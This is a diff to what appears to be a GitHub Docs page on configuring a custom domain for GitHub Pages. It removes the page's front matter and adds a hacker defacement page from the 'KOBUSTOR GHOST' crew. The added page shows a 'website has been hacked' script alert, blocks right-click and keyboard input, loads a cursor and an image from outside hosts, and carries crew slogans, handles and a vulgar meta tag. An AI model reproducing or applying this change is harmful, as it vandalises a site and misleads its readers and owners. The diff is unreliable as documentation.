@@ -1,26 +1,30 @@
----
-title: Configuring a custom domain for your GitHub Pages site
-intro: 'You can customize the domain name of your {% data variables.product.prodname_pages %} site.'
-redirect_from:
-  - /articles/tips-for-configuring-an-a-record-with-your-dns-provider
-  - /articles/adding-or-removing-a-custom-domain-for-your-github-pages-site
-  - /articles/configuring-an-a-record-with-your-dns-provider
-  - /articles/using-a-custom-domain-with-github-pages
-  - /articles/tips-for-configuring-a-cname-record
-  - /articles/setting-up-a-custom-domain-with-pages
-  - /articles/setting-up-a-custom-domain-with-github-pages
-  - /articles/configuring-a-custom-domain-for-your-github-pages-site
-  - /github/working-with-github-pages/configuring-a-custom-domain-for-your-github-pages-site
-product: '{% data reusables.gated-features.pages %}'
-versions:
-  fpt: '*'
-  ghec: '*'
-topics:
-  - Pages
-children:
-  - /about-custom-domains-and-github-pages
-  - /managing-a-custom-domain-for-your-github-pages-site
-  - /verifying-your-custom-domain-for-github-pages
-  - /troubleshooting-custom-domains-and-github-pages
-shortTitle: Configure a custom domain
----
+<html lang="en-US"><head><title>Hacked By ./Rapid~Shock</title>
+<meta property="og:title" content="Was Here">
+<meta property="og:description" content="Ngentod">
+<meta property="og:author" content="./Rapid~Shock">
+
+<meta charset="UTF-8">
+<script>
+  alert('Hello Admin Your Website Has Been Hacked')
+</script>
+
+<style>body{background:#000;
+       cursor: url(http://cur.cursors-4u.net/cursors/cur-9/cur862.ani), url(http://cur.cursors-4u.net/cursors/cur-9/cur862.png), progress !important;
+}
+
+
+ </style>
+
+
+</head><body oncontextmenu="return false" onkeydown="return false" onmousedown="return false"><br><br><br>
+<center><img style="width:500px;" src="https://a.top4top.io/p_2223loexc4.jpg">
+
+ <br><br><font color="white" face="courier new">Hacked By KOBUSTOR GHOST</font>
+      <br><br><font color="white" face="courier new">When we all have access to information, we are strong. When we are strong, we still have the power to do the impossible.
+We do things that we do for the people, not for our own benefit as a fame.
+
+</font>
+<br><font color="white" face="courier new">
+Promises and lies, brought us down, not forward<br>We say, you are an idea, just like us, just like us, Kobustor Ghost is the community</font><br><br><font color="white" face="courier new">We Are KOBUSTOR GHOST :<br>./XH4YP3R1337 - RaraXCyber - QueenCaa - Rabbit./Lex07 - ItS•Megan7w7 - InYour XerXez7 - StarXploit - T1L3-D34T - /Tn.SecretTeror404  - MR.EXCEL - ./Rapid Shock - @-root~Kyy - ./S4dboyXPLOID404 - XNUEXR M119 - MR. 51X.999 - TN. S1XBOY6667</font>
+   
+   </center></body></html>
